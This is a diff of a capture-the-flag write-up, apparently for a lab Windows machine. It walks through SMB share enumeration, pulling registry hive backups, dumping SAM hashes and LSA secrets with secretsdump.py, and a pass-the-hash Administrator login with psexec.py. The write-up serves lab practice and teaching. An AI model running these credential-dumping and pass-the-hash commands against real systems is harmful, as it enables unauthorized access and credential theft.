@@ -2,7 +2,8 @@
 
 We started like always scanning the IP using `nmap`, we see that port `445` is open so we can look for shares in `SMB`.
 using `smbclient` to list all the available shares:
-smbclient -L [ip]
+
+        smbclient -L [ip]
 we got this:
 
 ```Sharename Type      Comment
@@ -15,7 +16,8 @@ we got this:
 
 as you see we can access `Backup`.
 we managed to access Backup using:
-smbclient \\\\[IP]\\Backup
+        
+        smbclient \\\\[IP]\\Backup
 and we found out three files:
 ![](https://i.ibb.co/FHR0CxL/Screen-Shot-2022-12-29-at-9-59-47-AM.png)
 we got them using `get`.
@@ -29,7 +31,9 @@ The three files are likely to be backup copies of three of the hives in the Regi
 using `secretsdump.py` module in impacket collections that performs various techniques to dump hashes from the remote machine without executing any agent there.
 so we run it with `psexec.py` to get logged in as Administrator.
 we dumped the local SAM hashes and LSA secrets after running:
-secretsdump.py -system system.save -security security.save -sam sam.save LOCAL
+        
+        secretsdump.py -system system.save -security security.save -sam sam.save LOCAL
 and we got access after running `psexec.py` with Administrator hashes:
-psexec.py Administrator@[IP] -hashes <NTLM hash>
+        
+        psexec.py Administrator@[IP] -hashes <NTLM hash>
 so we got the flag in the same directory as the first machine.
